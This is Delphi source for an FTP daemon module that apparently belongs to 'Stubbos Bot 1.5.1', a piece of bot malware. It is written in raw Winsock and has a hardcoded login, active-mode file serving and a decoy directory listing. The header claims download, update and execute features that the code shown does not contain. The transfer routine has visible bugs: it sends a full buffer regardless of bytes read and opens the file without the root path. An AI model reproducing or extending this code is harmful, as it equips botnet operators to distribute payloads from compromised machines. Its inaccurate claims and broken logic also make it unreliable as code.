(*
  FTP Support.
  This pas was written by p0ke.
  If you use it, make sure to put credit where credit is due.

  This procedure can download, update and execute files from ftp-servers.
  Coded in pure winsock api.
*)

unit untFTPb;

interface

uses
  Windows, Winsock, untFunctions;

  {$I stubbos_config.ini}

Const
  WM_USER = 1024;

type
  TFTPServ      = Class(TObject)
  Private
    dTransferType       :String;
    dCurrentDir         :String;
    dTransferPor        :String;

    dRmtIP              :String;
    dRmtPort            :Integer;

    dSock               :TSocket;
    cSock               :TSocket;
    tSock               :TSocket;

    dWSA                :TWSAData;
    tWSA                :TWSAData;

    dAddr               :TSockAddrIn;
    cAddr               :TSockAddrIn;
    tAddr               :TSockAddrIn;
    Function FTPReceive(_Sock: TSocket): Integer;
    Function SendData(Text: String; Sock: TSocket): Integer;
    Function FTP_DATA_TRANSFER(dFile: String): Integer;
    Function FTP_DATA_CONNECT(dIP: String; dPort: Integer): Integer;
    Procedure GetPort(dPar: String);
    Function GetRemoteInfo(dInt: Integer; dSock: TSocket): String;
  Public
    dRoot               :String;
    dUser               :String;
    dPass               :String;
    dPort               :Integer;
    Function FTPD: Dword;
  End;

implementation

Function TFTPServ.FTPReceive(_Sock: TSocket): Integer;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 120;
  TimeOut.tv_usec :=  0;

  FD_ZERO(FD_STRUCT);
  FD_SET (_Sock, FD_STRUCT);

  IF (Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0) Then
  Begin
    CloseSocket(_Sock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;

Function TFTPServ.SendData(Text: String; Sock: TSocket): Integer;
Begin
  Text := Text + #13#10;
  Result := Send(Sock, Text[1], Length(Text), 0);
End;

Procedure TFTPServ.GetPort(dPar: String);
Var
  tIP   :String;
  tPort :String;
  tCount:Integer;
  I     :Integer;
Begin
  // 1,2,3,4,60,70
  tCount := 0;
  For I := Length(dPar) Downto 1 Do
  Begin
    If (dPar[I] = ',') Then
      Inc(tCount);
    If (tCount = 2) Then
    Begin
      tPort := Copy(dPar, I+1, Length(dPar));
      tIP := Copy(dPar, 1, I-1);
      Break;
    End;
  End;

  ReplaceStr(',', '.', tIP);
  tPort := IntToStr((StrToInt(Copy(tPort, 1, Pos(',', tPort)-1)) * 256) + StrToInt(Copy(tPort, Pos(',', tPort)+1, Length(tPort))));

  dRmtIP := tIP;
  dRmtPort := StrToInt(tPort);
End;

Function TFTPServ.GetRemoteInfo(dInt: Integer; dSock: TSocket): String;
Var
  dSo   :TSockAddrIn;
  dSi   :Integer;
Begin
  dSi := SizeOf(dSo);
  GetPeerName(dSock, dSo, dSi);
  Case (dInt) Of
    1: Result := inet_nToa(dSo.SIN_ADDR);
    2: Result := IntToStr(nTohs(dSo.sin_port));
  End;
End;

Function TFTPServ.FTPD: Dword;
Var
  Size  :Integer;
  dCmd  :String;
  dPar  :String;
  dBuf  :Array[0..1514] Of Char;
  dDir  :String;
  dMode :Integer;
Begin
  WSAStartUp($0101, dWSA);

  dMode := 1;
  dSock := Socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  WSAASYNCSELECT(dSock, 0, WM_USER + 1, FD_READ);

  FillChar(dAddr, SizeOf(dAddr), 0);
  dAddr.sin_family := AF_INET;
  dAddr.sin_port := hTons(dPort);
  Bind(dSOck, dAddr, SizeOf(dAddr));

  While TRUE Do
  Begin
    If (Listen(dSock, 10) = SOCKET_ERROR) Then Exit;

    Size := SizeOf(TSockAddr);
    cSock := Accept(dSock, @cAddr, @Size);

    If (cSock <> INVALID_SOCKET) Then Break;
  End;

  SendData('220 ' + FTP_WELCOMETEXT, cSock);

  While (FTPReceive(cSock) = 0) Do
  Begin
    ZeroMemory(@dBuf, SizeOf(dBuf));
    Recv(cSock, dBuf, SizeOf(dBuf), 0);
    dCmd := String(dBuf);
    Delete(dCmd, Length(dCmd)-1, 2);    
    If (Pos(' ', dCmd) > 0) Then
    Begin
      dPar := Copy(dCmd, Pos(' ', dCmd)+1, Length(dCmd));
      Delete(dCmd, Pos(' ', dCmd), Length(dCmd));
    End;

    // User
    If (dCmd = 'USER') Then
      If (dPar = dUser) Then
        SendData('331 Password Required for "'+dUser+'".', cSock)
      Else
        CloseSocket(cSock);

    // Password
    If (dCmd = 'PASS') Then
      If (dPar = dPass) Then
        SendData('230 User Logged In.', cSock)
      Else
        CloseSocket(cSock);

    // Syst
    If (dCmd = 'SYST') Then
      SendData('215 ' + FTP_SYSTEMTEXT, cSock);

    // Rest
    If (dCmd = 'REST') Then
      SendData('350 Restarting.', cSock);

    // PWD
    If (dCmd = 'PWD') Then
    Begin
      dDir := dCurrentDir;
      ReplaceStr('\', '/', dDir);

      SendData('257 "'+dDir+'" is current directory.', cSock);
    End;

    // FEAT
    If (dCmd = 'FEAT') Then
      SendData('211 End', cSock);

    // Type
    If (dCmd = 'TYPE') Then
    Begin
      dTransferType := dPar;
      SendData('200 Type set to '+dTransferType, cSock);
    End;

    // Pasv
    If (dCmd = 'PASV') Then
      SendData('425 Passive not supported on this server', cSock);

    // List
    If (dCmd = 'LIST') Then
    Begin
      SendData('150 Opening ASCII mode data connection.', cSock);
      If (FTP_DATA_CONNECT(dRmtIP, dRmtPort) = 1) Then
      Begin
        SendData('-rw-r--r--   1 sic      stfu         13179 Jan 13 18:50 DLL Injectgion.zip', tSock);
        CloseSocket(tSock);
      End;
      SendData('226 Transfer complete', cSock);
    End;

    // Port
    If (dCmd = 'PORT') Then
    Begin
      GetPort(dPar);
      SendData('200 PORT Command Successful', cSock);
    End;

    // Retr
    If (dCmd = 'RETR') Then
    Begin
      If (dRmtIP = '') Then dRmtIP := GetRemoteInfo(1, cSock);
      If (dRmtPort = 0) Then dRmtPort := StrToInt(GetRemoteInfo(2, cSock))+1;

      If (dTransferType = 'I') Then
        SendData('150 Opening BINARY mode data connection.', cSock)
      Else
        SendData('150 Opening ASCII mode data connection.', cSock);

      If (FTP_DATA_CONNECT(dRmtIP, dRmtPort) = 1) Then
      Begin
        If (FTP_DATA_TRANSFER(dPar) = 1) Then
          SendData('226 Transfer Complete.', cSock);
      End Else
        SendData('425 Can''t open data connection', cSock);

    End;

    // quit
    If (dCmd = 'QUIT') Then
      SendData('221 Goodbye, Stubbos Bot 1.5.1 - FTPD 1.0', cSock);

  End;

  CloseSocket(dSock);
  CloseSocket(cSock);
  CloseSocket(tSock);
End;

Function TFTPServ.FTP_DATA_CONNECT(dIP: String; dPort: Integer): Integer;
Begin
  WSAStartUp($0101, tWSA);
  tSock := SOCKET(AF_INET, SOCK_STREAM, 0);

  tAddr.sin_family := AF_INET;
  tAddr.sin_addr.s_addr := inet_addr(pChar(dIP));
  tAddr.sin_port := hTons(dPort);

  If (Connect(tSock, tAddr, SizeOf(tAddr)) = -1) Then
  Begin
    CloseSocket(tSock);
    WSACleanUp;
    Result := 0;
  End Else Result := 1;
End;

Function TFTPServ.FTP_DATA_TRANSFER(dFile: String): Integer;
Var
  FD    :FILE;
  Buffer:Array[0..1514] Of Char;
  tRead :Integer;
Begin
  If (Not FileExists(dRoot + dCurrentDir + dFile)) Then
  Begin
    Result := 0;
    Exit;
  End;

  AssignFile(FD, dFile);
  Reset(FD, 1);

  While (Not EOF(FD)) Do
  Begin
    BlockRead(FD, Buffer, SizeOf(Buffer), tRead);
    Send(tSock, Buffer, SizeOf(Buffer), 0);
    Sleep(1);
  End;

  CloseFile(FD);
  CloseSocket(tSock);
  WSACleanUP;
  Result := 1;
End;

End.
 